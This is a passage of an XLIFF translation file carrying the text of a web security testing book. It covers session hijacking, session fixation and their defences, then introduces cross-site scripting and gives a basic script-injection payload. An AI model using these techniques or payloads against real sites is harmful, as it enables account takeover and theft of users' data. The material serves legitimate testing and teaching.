          <source>The attacker's objective in session hijacking is to masquerade as another legitimate user by using that person's identifying credentials&amp;mdash;the session identifier. The most common way of achieving this is to steal that user's session identifier by various means. (The cross-site scripting attack is often associated with this goal, although monitoring network traffic is another avenue.) However, as we shall see later, it is also possible to &amp;quot;give&amp;quot; a user a compromised session.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>Poorly implemented session handlers open the door to guessing previous or future session identifiers. The most obvious is where IDs are allocated sequentially, so the next person to visit the application will get the n+1 (or some other identifiable pattern) value. Therefore, we should first try to gather a number of session identifiers and see if we can find a pattern that will allow us to predict what identifiers a Web site will use for future and past visitors.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>If we know or can figure out a session identifier, we can replace the value of the session variable (hidden field, CGI parameter, or cookie) with another valid one and then request a page again. However, with or without this knowledge, it may be necessary to try the attack several times as legitimate users log into and out of the Web site.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>Some Web applications may provide helpful error messages when an invalid session is requested, which helps with this attack, but the main clue that the attack is successful is when personalized information of another user appears, as in &lt;a class="docLink" href="#ch04fig14"&gt;Figure 4-16&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.center.h5.text">
          <source>Figure 4-16. Personalized information in a Web application.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>Another form of attacking session management is called &lt;span class="docEmphStrong"&gt;session fixation&lt;/span&gt;. It is subtly different from session hijacking because hijacking suggests that there is something &lt;span class="docEmphasis"&gt;in-place&lt;/span&gt; to take. Session fixation occurs when the session ID is stolen before a legitimate user ever gets it. The attacker can then take the session from the legitimate user any time it is advantageous to do so.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>As &lt;a class="docLink" href="#ch04fig15"&gt;Figure 4-17&lt;/a&gt; shows, this attack works by an attacker either generating a compromised session, or, depending on the session management mechanism, providing a link to the Web site with the session identifier already</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>provided in the URL. The unsuspecting user logs in or clicks on the link and uses the Web application. Because the session is a valid one, the legitimate user doesn't notice a difference. However, the critical problem is that the attacker now knows the legitimate user's session identifier and can assume his identity.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.center.h5.text">
          <source>Figure 4-17. Setting up a session fixation attack.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>The most probable targets for session fixation attacks are Webmail-type systems. This is because taking over a user's shopping cart doesn't really achieve anything (an attacker is unlikely to want to pay for someone else's goods!), but being able to read or send another user's e-mail after he has finished is a conceivable attack.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.table.tr.td.h5.text">
          <source>How to Protect Against This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>Session management is a necessity of Web applications, and if done correctly, it can be an effective protection mechanism against a number of attacks, including session hijacking. That's why it's typical for Web developers to utilize sessions, despite their security implications. Here's some advice about doing it right.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>Protection of a session needs to focus on the unique session identifier because it is the only thing that distinguishes users. If the session ID is compromised, attackers can impersonate other users on the system.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>The first thing is to ensure that the sequence of identification numbers issued by the session management system is unpredictable; otherwise, it's trivial to hijack another user's session. Having a large number of possible session IDs (meaning that they should be very long) means that there are a lot more permutations for an attacker to try.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>Developers also need to pay attention to the random qualities (those that are nonsequential and hard to guess) of chosen individual IDs so that an attacker cannot easily determine the algorithm used to generate the session IDs.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>Taking care to generate good session IDs is just the beginning. After you've generated the ID, you must protect it, which is a concept called &lt;span class="docEmphStrong"&gt;session management&lt;/span&gt;. Good session management consists of the following:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.ul.li.p.text">
          <source>Using cookies for storing session values.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.ul.li.p.text">
          <source>Cookies are generally more difficult to modify than hidden fields or CGI parameters. You can protect them by using mechanisms like setting the secure flag (so they cannot be &amp;quot;sniffed&amp;quot; unencrypted on the network). In addition, you can restrict cookies to a particular site or even a section of a site (using the path attribute of the cookie&lt;sup class="docFootnote"&gt;&lt;a class="docLink" href="#ch04fn04"&gt;[4]&lt;/a&gt;&lt;/sup&gt;), or set them to expire automatically.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.ul.li.blockquote.p.text">
          <source>&lt;sup&gt;&lt;a name="ch04fn04"&gt;[4]&lt;/a&gt;&lt;/sup&gt; The path attribute is not a completely trustworthy mechanism. It's just one more tool in a Web developer's arsenal.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.ul.li.p.text">
          <source>Not allowing users to choose their own session identifiers.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.ul.li.p.text">
          <source>Some session management systems allow users to reactivate their session if they have a valid session ID but it has been expired. There is no</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.ul.li.p.text">
          <source>good reason why an existing session should be reactivated because a new session can be created with a different session identifier but the same stored state. If an attacker discovers that session identifiers are being reused, he can gather a number of valid ones and have an immediate advantage in a session fixation attack.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.ul.li.p.text">
          <source>Ensuring that each user gets a &amp;quot;clean&amp;quot; session identifier number with each visit and revisits to your site.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.ul.li.p.text">
          <source>Users should get a new session number each time they visit your site, because that makes the attacker's job of giving them a compromised ID irrelevant. You can check this by comparing the referring page against the URL of the site. If they are different, you should create a new session identifier. However, a downside to this is that it might break the &amp;quot;remember me&amp;quot; and &amp;quot;single-click shopping&amp;quot; that some e-commerce sites use.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.ul.li.p.text">
          <source>Time-out session identifiers so someone cannot reuse them after a predetermined period of time.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.ul.li.p.text">
          <source>Storing session variables on the server allows the Web application to keep track of what sessions have been created and when. If no one has used a session for a specified period (based on user activity or a predefined time), you should expire it. This gives the attacker a smaller window of opportunity to guess (or brute force) valid session identifiers.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.ul.li.p.text">
          <source>Allowing users to log out and clear their session.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.ul.li.p.text">
          <source>When a user logs out, this action should invalidate identification numbers from both the client and the server. Not only should it clear the current sessions, but it should clear all other sessions that the users may have initiated but have failed to log out of because of forgetfulness (browsing away from the site) or some other issue like server failure.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.ul.li.p.text">
          <source>Utilizing the HTTP referer field to identify multiple clients browsing with the same ID.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.ul.li.p.text">
          <source>If the Web application can &amp;quot;track&amp;quot; users through the site and has clear paths of browsing that users follow, it's possible to discover situations where two or more people are using the same identifier. The basic idea is to know the correct page sequence of the site. If a request for a page that should not be accessible is received, then either a URL-jumping attack is in progress, or another user is using the same session identifier and is out of step with the original user. In both situations, the session identifier should be invalidated.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.ul.li.p.text">
          <source>Ensuring that session cookies are sent only over secure channels to prevent them from being captured in transit.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.ul.li.p.text">
          <source>You wouldn't want credit card numbers being sent in clear text across the network, and because session identifiers are indirect references to users' information, you should protect them equally. Because cookies are sent with every request matching a specified domain and path, it's easy for them to be inadvertently sent over a nonencrypted channel where an attacker may be listening. Therefore, you should set the secure flag for all session identifier cookies to ensure that they are sent only over HTTPS.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>Even with these precautions, there's the possibility of an attacker discovering a current session ID by &amp;quot;stealing&amp;quot; a cookie through cross-site scripting, so protecting against that attack is a crucial facet of protecting against this one. Cross-site scripting is a topic for another chapter.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch04lev1sec1.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="ch04lev1sec3.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>References</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch04lev1sec2.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>References</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.a.text">
          <source>http://www.parosproxy.org</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.a.text">
          <source>http://www.securityspace.com/s_survey/data/man.200507/cookieReport.html</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.a.text">
          <source>http://www.dutchduck.com/help/cookiesexplorer/faq/</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.a.text">
          <source>http://www.acros.si/papers/session_fixation.pdf</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch04lev1sec2.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="ch05.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Chapter 5. Attacking User-Supplied Input Data</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch04lev1sec3.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h2.text">
          <source>Chapter 5. Attacking User-Supplied Input Data</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>What's In This Chapter?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>Introduction</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch04lev1sec3.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="ch05lev1sec1.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>What's In This Chapter?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch05.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>What's In This Chapter?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This chapter details methods of tampering with input data that is passed from the client machine to the Web application that resides on the Web server. These attacks are mandatory for any Web application and represent some of the most commonly exploited vulnerabilities in modern Web applications.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch05.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="ch05lev1sec2.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Introduction</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch05lev1sec1.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>Introduction</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>When a Web application or any program reads user-supplied input, many things can go wrong. The input may be too long, of the wrong type (for example, the user may have entered a character where a number was expected), or represent an illegal or harmful value (a user may try to order a negative number of an item hoping to get a credit on his account).</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This situation of users not obeying developer rules regarding input is nothing new. Developers have been told for years to constrain input fields as much as possible and validate everything the user enters. The problem is that they don't listen to this advice or, at least, that they don't think of all possible bad values. It gets even more dangerous when the input data contains code, scripts, or operating system commands. In some cases, those commands or code can be executed on the Web server resulting in a serious compromise of the Web site and the machine that runs it.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This chapter is about this specific situation: code embedded in user input data that is transmitted to the Web application on the server. We will study what can go wrong when this situation manifests, and what we need to do to prevent it.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h4.text">
          <source>Attack 11 Cross-Site Scripting</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Cross-site scripting (XSS) is a common method of exploiting a user of a Web site by presenting that user with fraudulent Web site content. As the name suggests, this fraudulent content comes through scripts entered into the URL or form fields of a vulnerable site.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Web sites often echo the input data that is entered at some other place within the application. Generally, this is plain text that is placed in the appropriate location in a predefined layout, but HTML can contain more than just text to display; it can also contain various client-side scripting code for doing various things, such as validating form fields or providing dynamic user interface elements like pop-up menus, as we discussed in Attack 5.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Most usage of client-side scripting is benign to the local machine. Its environment of execution is restricted to certain operations known as a &lt;span class="docEmphStrong"&gt;sandbox&lt;/span&gt;, so a remote user cannot force your machine through cross-site scripting to reformat its hard disk just by visiting a malicious Web page (although this may be possible with ActiveX controls&amp;mdash;see &lt;a class="docLink" href="ch09.html#ch09"&gt;Chapter 9&lt;/a&gt;, &amp;quot;Privacy&amp;quot;). However, allowing users to provide input to the application that is employed as client-side scripting is dangerous. XSS means exactly this: One user enters a script that is executed on the computer of another user.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Despite the sandbox protecting the user from serious harm, client-side code has to be able to perform some operations and access limited resources, namely the same files and local resources that the victim user's browser has access to. This is dangerous because when a script executes, it has access to the current page and all information contained therein. That means someone of harmful intent can use XSS to steal a user's cookie (and allow an attack to impersonate the user), redirect a user to an alternate, malicious site, and present additional fake content to the user to convince him to enter private or personal information that may be advantageous to an attacker.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>There are two primary ways of exploiting a site that is vulnerable to XSS:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>&lt;span class="docEmphStrong"&gt;Scenario 1: Stored XSS&amp;mdash;&lt;/span&gt; The most common place for attackers to look for XSS vulnerabilities is where one user enters information that is viewed by another user who is visiting the same site. Examples</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>include messages, book reviews, guestbook entries, or blog comments. When another user visits the Web site at some point in the future, the application gathers the data from storage and displays it. Echoing static data in this manner is mostly harmless (its content may be offensive or annoying), but an attacker can introduce scripts instead of static data, which the browser treats differently.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>In this situation, the attacker generally enters the scripts directly into the form field of the vulnerable site. In this type of &lt;span class="docEmphStrong"&gt;drive-by download&lt;/span&gt;, script code is left behind on the vulnerable server. Those scripts execute when another user visits the site.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>&lt;span class="docEmphStrong"&gt;Scenario 2: Reflected XSS&amp;mdash;&lt;/span&gt; Another possibility is to embed the script into the CGI parameters of a URL. That way, an attacker can send a link to a potential victim via an e-mail, and when the victim clicks the link, the real page is loaded and its content changed by the script that is embedded in the URL. This scenario does not require that the vulnerable site actually store script code, because the code is executed when the page loads for anyone unlucky enough to click on the tampered link.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Don't confuse either of these scenarios with what the industry calls phishing. &lt;span class="docEmphStrong"&gt;Phishing&lt;/span&gt; means presenting the user with a completely fake site masquerading as a legitimate one. In the case of phishing, the fake URL and the legitimate URL are completely different. Phishers generally copy a legitimate site, add their own exploit code, and then hope a user visits the site, often choosing common misspellings of legitimate sites like Microsoft, Google, Amazon, and various financial institutions (or any other site that is a profitable target) as a way to increase their chances of drawing an unsuspecting user. But with XSS, the exploit is embedded into the legitimate site, so the user is liable to be more trusting with the data he enters.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Phishing is a scam that only diligence and the law will wipe out. XSS is a vulnerability that falls into the realm of our responsibility as developers and testers.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>When to Apply This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Apply this attack when users supply input data that the Web application echoes to &lt;span class="docEmphasis"&gt;other&lt;/span&gt; users. It's an important distinction, because even though areas vulnerable to XSS may be discovered in the application (with good argument to be fixed because of lack of input validation), if another user never encounters the attack, the point is moot. There's no point in hacking yourself! The most obvious place to apply this attack is through form input fields that save data to permanent storage (that is, a database or file), or the URL itself where scripts could replace CGI parameters.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>But we cannot overlook less obvious places like Web services and other custom code that accesses the data on the Web server directly (known as &lt;span class="docEmphStrong"&gt;second-order injection&lt;/span&gt;&amp;mdash;in which a different application may use tainted data that our application supplies).</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>How to Conduct This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>HTML allows for several mechanisms where scripting can be embedded into a page, the most obvious of which is between the &lt;tt&gt;&amp;lt;script&amp;gt; ... &amp;lt;/script&amp;gt;&lt;/tt&gt; tags. The easiest way to see if code is successfully executing is to use the &lt;tt&gt;alert&lt;/tt&gt; function to pop up a message box like that shown in &lt;a class="docLink" href="#ch05fig01"&gt;Figure 5-1&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 5-1. Client-side code popping up an alert box.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>You achieve this by writing the following into form fields that are stored or a CGI parameter, which are then used for output.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>&amp;lt;script&amp;gt;alert("XSS alert!")&amp;lt;/script&amp;gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Some HTML tags are also vulnerable to script injection. For example, an &lt;tt&gt;image&lt;/tt&gt; tag that looks like this:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>&amp;lt;img src="path/to/image.gif&amp;gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>can be changed to</source>
          <target></target>
        </trans-unit>
